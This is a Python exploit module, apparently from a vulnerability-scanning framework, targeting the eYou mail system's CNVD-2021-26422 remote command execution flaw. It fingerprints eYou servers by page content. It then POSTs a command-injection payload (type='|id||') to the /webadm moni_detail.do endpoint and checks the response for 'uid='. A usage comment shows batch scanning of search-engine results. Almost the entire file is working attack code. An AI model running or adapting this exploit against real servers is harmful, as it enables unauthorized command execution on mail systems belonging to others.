# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-19 15:22

from core.data import gLogger
from exploit.scripts import BaseScript
from core.myenums import BugType, BugLevel
from core.request.asynchttp import *

# python3 batch.py -m exploit.scripts.Mail.Eyou.CNVD-2021-26422 -cs -fs "app=\"eYou-邮件系统\""


class Script(BaseScript):
    name = 'Eyou Mail'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level = BugLevel.HIGH
        # 类型
        self.bug_type = BugType.RCE
        # 编号
        self.bug_number = 'CNVD-2021-26422'
        # 来源
        self.bug_refer = 'https://mp.weixin.qq.com/s/wH5luLISE_G381W2ssv93g'
        # 特定路径判断
        self.detect_path_list = ['/']
        # exec
        self.exec_path_list = ['/webadm/?q=moni_detail.do&action=gragh']
        # 相关信息
        self.info = ''

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            for detect_path in self.detect_path_list:
                url = f'http://{self.target}{detect_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{detect_path}'
                text = await AsyncFetcher.fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
                if text is not None and (('eYouMail' in text and 'eYouWS' in text) or 'eyou 邮件系统' in text or 'content="亿邮电子邮件系统' in text or '/tpl/login/user/images/dbg.png' in text or 'var loginssl = document.form_login.login_ssl.value;' in text):
                    self.flag = True
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                    return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

    async def exec(self):
        headers = self.headers.copy()
        headers.update({'Content-Type': 'application/x-www-form-urlencoded'})
        async with aiohttp.ClientSession() as session:
            for exec_path in self.exec_path_list:
                url = f'http://{self.target}{exec_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{exec_path}'
                data = "type='|id||'"
                text = await AsyncFetcher.post_fetch(session=session, url=url, headers=headers, data=data, timeout=self.req_timeout)
                if text is not None and 'uid=' in text:
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, self.bug_type, url))
                    return {'name': '{} {}'.format(self.name, self.bug_type), 'url': url, 'software': self.name}


if __name__ == '__main__':
    pass
